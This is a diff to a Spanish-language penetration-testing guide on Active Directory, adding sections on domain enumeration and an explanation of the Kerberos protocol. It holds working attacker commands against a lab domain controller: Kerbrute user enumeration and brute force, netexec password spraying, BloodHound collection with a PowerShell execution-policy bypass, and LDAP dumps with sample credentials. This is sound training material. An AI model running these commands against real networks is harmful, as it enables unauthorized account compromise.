@@ -3912,10 +3912,7 @@ Get-GPOReport -Name "NombreGPO" -ReportType XML
 ```powershell
 Set-GPRegistryValue -Name "NombreGPO" -Key "HKEY_CURRENT_USER\Software\Ejemplo" -ValueName "Ejemplo" -Type String -Value "ValorEjemplo"
 ```
-#####
-```powershell
 
-```
 ##### Enlace de una GPO a una OU específica
 
 ```powershell
@@ -3940,23 +3937,198 @@ Para restaurar desde una copia de seguridad:
 Restore-GPO -Name "NombreGPO" -Path "C:\Ruta\Backup"
 ```
 
-####  11.1.9. <a name='unidades-organizativas-1'></a>Unidades Organizativas
-####  11.1.10. <a name='gpo-(group-policy-object)-1'></a>GPO (Group Policy Object)
+### Enumeración
 
-###  11.2. <a name='escalación-de-privilegios-3'></a>Escalación de privilegios
+Si no tenemos un usuario con el que empezar las pruebas (que suele ser el caso), tendremos que encontrar una manera de establecer un punto de apoyo en el dominio, ya sea obteniendo credenciales en texto claro o un hash de contraseña NTLM para un usuario, un shell SYSTEM en un host unido al dominio, o un shell en el contexto de una cuenta de usuario de dominio. Obtener un usuario válido con credenciales es crítico en las primeras etapas de una prueba de penetración interna. Este acceso (incluso al nivel más bajo) abre muchas oportunidades para realizar enumeraciones e incluso ataques.
 
-####  11.2.1. <a name='grupos-privilegiados'></a>Grupos Privilegiados
+#### Kerbrute
 
-##### Account Operators
-##### Server Operators
-##### DnsAdmins
-##### Backup Operators
+[Kerbrute](https://github.com/ropnop/kerbrute) puede ser una opción más sigilosa para la enumeración de cuentas de dominio. Se aprovecha del hecho de que los fallos de pre-autenticación Kerberos a menudo no activan registros o alertas. Utilizaremos Kerbrute junto con las listas de usuarios como pueden ser **jsmith.txt** o **jsmith2.txt** de [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). Este repositorio contiene muchas listas de usuarios diferentes que pueden ser extremadamente útiles cuando se intenta enumerar usuarios cuando se comienza desde una perspectiva no autenticada. Podemos apuntar Kerbrute al DC y alimentarlo con una lista de palabras. La herramienta es rápida, y se nos proporcionarán resultados que nos permitirán saber si las cuentas encontradas son válidas o no, lo cual es un gran punto de partida para lanzar ataques como el de Password Spraying.
+
+Por medio de una lista de usuarios, como puede ser las mencionadas anteriormente podemos ver usuarios válidos a nivel de dominio gracias a los fallos de pre-autenticación Kerberos
+
+```bash
+kerbrute userenum -d HACKLAB.LOCAL --dc 192.168.56.10 jsmith.txt -o ad_users.txt
+```
+
+Puede haber veces que un usuario tenga de contraseña su mismo nombre de usuario:
+
+```bash
+kerbrute bruteuser --d HACKLAB.LOCAL -dc 192.168.56.10 jsmith.txt thomas.brown
+```
+
+Otras herramientas a tener en cuenta son [RPCClient](#426-rpcclient) y [Enum4Linux](#424-enum4linux).
+
+
+#### Password Spraying
+
+Otro aspecto destacable es el ataque conocido como Password Spraying. Para contextualizar, imaginemos que disponemos de unas credenciales como `thomas.brown:MySup3erPass123!`. Una táctica común en este escenario es conectarse al Protocolo de Llamada a Procedimientos Remotos (RPC) - para extraer una lista de todos los usuarios del dominio. Esta lista se guarda en un archivo, por ejemplo users.txt, y luego se proporciona como entrada a herramientas como el propio netexec, junto con la contraseña antes mencionada. Este proceso permite intentar el acceso a múltiples cuentas del dominio, aprovechando la débil seguridad de la contraseña utilizada.
+
+```bash
+nxc smb 192.168.56.10 -u users.txt -p 'password' --continue-on-success
+```
+
+Por otra parte, si contamos con una lista de contraseñas también podemos utilizarlas.
+
+```bash
+nxc smb 192.168.56.10 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
+```
+
+El argumento `--no-bruteforce` se emplea para evitar la prueba de todas las contraseñas disponibles para cada usuario, en su lugar, se prueba el usuario de la línea 1 con la contraseña de la línea 1, el usuario de la línea 2 con la contraseña de la línea 2, y así sucesivamente.
+
+#### BloodHound
+
+##### Opción 1
+
+La primera forma de enumerar con Bloodhound, es hacerlo desde la máquina atacante utilizando `bloodhound.py`.
+
+```bash
+python3 bloodhound.py -u 'thomas.brown' -p 'MySup3erPass123!' -d HACKLAB.local -ns 192.168.56.10 -ns 192.168.56.10 --zip -c All
+```
+
+##### Opción 2
+
+La segunda manera, consta de los siguientes pasos:
+
+1. Descargar [SharpHound.ps1](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)
+
+```bash
+wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
+```
+
+2. Subirlo a la máquina víctima ya sea con un servidor de SMB o upload de evil-winrm.
+3. Importar el módulo:
+```powershell
+powershell -ep bypass
+Import-Module .\SharpHound.ps1
+```
+4. Invocar a `BloodHound`
+
+```powershell
+Invoke-BloodHound -CollectionMethod All
+```
+Ahora queda descargar el zip y meterlo en BloodHound.
+
+##### Opción 3
+
+Otra alternativa es utilizar [SharpHound.exe](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe).
+
+```powershell
+.\SharpHound.exe -c all
+```
+
+Por ultimo, descargamos el archivo `zip` nuevamente y los subimos en `BloodHound`.
+
+#### ldapsearch
+Para enumerar a través del protoclo LDAP, podemos usar la herramienta `ldapsearch`:
+
+```bash
+ldapsearch -H ldap://192.168.56.10 -x -s base namingcontexts
+```
+
+- `-H ldap://192.168.56.10`: Especifica el URI del servidor LDAP al que se va a conectar. En este caso, ldap://192.168.56.10.
+
+- `-x`: Indica que se utilizará el método de autenticación simple. Esto es comúnmente utilizado para realizar pruebas, pero no es seguro para ambientes de producción.
+
+- `-s base`: Especifica el alcance de la búsqueda. En este caso, base significa que la búsqueda se realiza en el objeto base especificado.
+
+- `namingContexts`: Especifica el atributo que se desea buscar. En este caso, namingContexts es el atributo que contiene los contextos de nombres del servidor LDAP.
+
+```bash
+ldapsearch -x -H ldap://192.168.56.10 -D '' -w '' -b "DC=192.168.56.10,DC=local"
+ldapsearch -x -h 192.168.56.10 -b "dc=hacklab,dc=local" "*" | awk '/dn: / {print $2}'
+ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erPass123!' -x -b "DC=HACKLAB,DC=LOCAL"
+ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erPass123!' -x -s base -b "DC=HACKLAB,DC=LOCAL" "(objectClass=*)" "*" +
+```
+
+#### ldapdomaindump
+
+En caso de tener credenciales válidas podemos hacer uso de `ldapdomaindump`:
+
+```bash
+ldapdomaindump -u 'HACKLAB.local\thomas.brown' -p 'Password123' 192.168.56.10
+```
+
+Esto generará unos archivos `json`, `grep`, `html` que con un servidor web podemos ver en el navegador.
+
+### Grupos Privilegiados
+
+#### Account Operators
+#### Server Operators
+#### DnsAdmins
+#### Backup Operators
 
 ###  11.3. <a name='kerberos'></a>Kerberos
 
 ![Kerberos](./img/kerberos.webp)
 
-###  11.4. <a name='explotación'></a>Explotación
+#### ¿Qué es Kerberos?
+
+Kerberos es un protocolo de **autenticación**, pero no de autorización. Esto significa que su función es verificar la identidad de un usuario mediante una contraseña conocida solo por él, sin definir a qué recursos o servicios puede acceder.  
+
+En entornos **Active Directory**, Kerberos juega un papel clave al proporcionar información sobre los privilegios de los usuarios autenticados. Sin embargo, la responsabilidad de verificar si estos privilegios son suficientes para acceder a determinados recursos recae en los propios servicios.
+
+El protocolo Kerberos opera a través de los puertos `UDP/88` y `TCP/88`, los cuales deben estar a la escucha en el `Key Distribution Center (KDC)` para garantizar el correcto funcionamiento del sistema de autenticación.
+
+Kerberos involucra varios componentes encargados de gestionar la autenticación de los usuarios. Los principales son:
+
+- **Cliente o usuario**: La entidad que desea acceder a un servicio.
+
+- **Application Server (AP)**: El servidor donde se encuentra el servicio al que el usuario quiere acceder.
+
+- **Key Distribution Center (KDC)**: Servicio central de Kerberos responsable de distribuir tickets a los clientes. Se ejecuta en el Controlador de Dominio (DC) e incluye:
+
+    - **Authentication Service (AS)**: Emite los Ticket Granting Tickets (TGTs), que permiten solicitar acceso a servicios sin necesidad de volver a introducir credenciales.
+
+Para garantizar la seguridad, Kerberos cifra y firma varias estructuras, como los tickets, evitando que sean manipuladas por terceros. En Active Directory, se manejan las siguientes claves de cifrado:
+
+- **Clave del KDC (krbtgt)**: Derivada del hash NTLM de la cuenta krbtgt.
+
+- **Clave de usuario**: Derivada del hash NTLM del propio usuario.
+
+- **Clave de servicio**: Basada en el hash NTLM del propietario del servicio, que puede ser una cuenta de usuario o del servidor.
+
+- **Clave de sesión**: Generada dinámicamente entre el cliente y el KDC para asegurar la comunicación.
+
+- **Clave de sesión de servicio**: Establecida entre el cliente y el AP para proteger la comunicación con el servicio.
+
+##### Tickets
+
+Kerberos utiliza **tickets**, estructuras que permiten a los usuarios autenticados realizar acciones dentro del dominio de Kerberos sin necesidad de volver a introducir credenciales. Existen dos tipos principales:
+
+- **Ticket Granting Ticket (TGT)**: Se presenta ante el KDC para solicitar otros tickets de servicio (TGS). Está cifrado con la clave del KDC.
+
+- **Ticket Granting Service (TGS)**: Se presenta ante un servicio para obtener acceso a sus recursos. Está cifrado con la clave del servicio correspondiente.
+
+##### PAC
+
+El **Privilege Attribute Certificate (PAC)** es una estructura incluida en la mayoría de los tickets, que contiene los privilegios del usuario. Está firmada con la clave del KDC, lo que garantiza su integridad.
+
+Si bien los servicios pueden verificar el PAC comunicándose con el KDC, esto no es una práctica común. En cualquier caso, esta verificación solo consiste en comprobar la firma del PAC, sin validar si los privilegios del usuario son correctos.
+
+Además, un cliente puede evitar que el PAC se incluya en su ticket especificándolo en el campo `KERB-PA-PAC-REQUEST` de la solicitud.
+
+##### Mensajes
+
+Kerberos permite la comunicación entre sus agentes mediante distintos tipos de mensajes, entre los más relevantes se encuentran:
+
+- **KRB_AS_REQ**: Enviado por el usuario para solicitar un TGT al KDC.
+
+- **KRB_AS_REP**: Respuesta del KDC, que entrega el TGT al usuario.
+
+- **KRB_TGS_RE**Q: Enviado por el usuario para solicitar un TGS al KDC, utilizando su TGT.
+
+- **KRB_TGS_RE**P: Respuesta del KDC, que envía el TGS solicitado al usuario.
+
+- **KRB_AP_REQ**: (Opcional) Utilizado por un servicio para autenticarse frente al usuario.
+
+- **KRB_ERROR:** Usado por los distintos agentes para notificar errores en la comunicación.
+
+Adicionalmente, aunque no forma parte del protocolo Kerberos sino de NRPC, el Application Server (**AP**) puede utilizar el mensaje `KERB_VERIFY_PAC_REQUEST` para enviar la firma del **PAC** al **KDC** y verificar su validez.
+
+A continuación se muestra un resumen de los mensajes siguiendo la secuencia de autenticación.
+
+![Kerberos Flow](./img/kerberos_flow.png)
 
 ###  11.5. <a name='movimiento-lateral-1'></a>Movimiento Lateral
 
